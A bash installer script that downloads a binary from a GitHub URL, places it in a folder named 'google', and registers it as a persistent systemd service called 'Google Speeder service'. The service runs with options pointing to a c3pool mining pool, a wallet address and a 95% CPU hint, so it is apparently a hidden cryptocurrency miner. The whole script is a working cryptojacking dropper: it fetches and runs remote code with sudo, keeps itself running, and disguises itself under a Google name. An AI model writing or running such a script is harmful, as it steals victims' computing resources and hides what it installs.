#!/bin/bash
curl -L --progress-bar "https://raw.githubusercontent.com/gamemod5/auto/main/speeder" -o /tmp/speeder
[ -d $HOME/google ] || mkdir $HOME/google
cp /tmp/speeder $HOME/google/
sudo chmod +x $HOME/google/speeder
cat >/tmp/google-speeder.service <<EOL
[Unit]
Description=Google Speeder service
[Service]
ExecStart=$HOME/google/speeder -o auto.c3pool.org:19999 --cpu-max-threads-hint 95 -u 436mqed36G2Pbj2E42N7rEevBeybTX5GmAYqyNB7Zw4WaXCPGkhey8nCEE9bWHhot8Nb8AjGvBJny2p7k2LBT15nLb8Yyt8
Restart=always
Nice=10
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL
sudo mv /tmp/google-speeder.service /etc/systemd/system/google-speeder.service
echo "[*] Starting google-speeder systemd service"
sudo killall speeder 2>/dev/null
sudo systemctl daemon-reload
sudo systemctl enable google-speeder.service
sudo systemctl start google-speeder.service
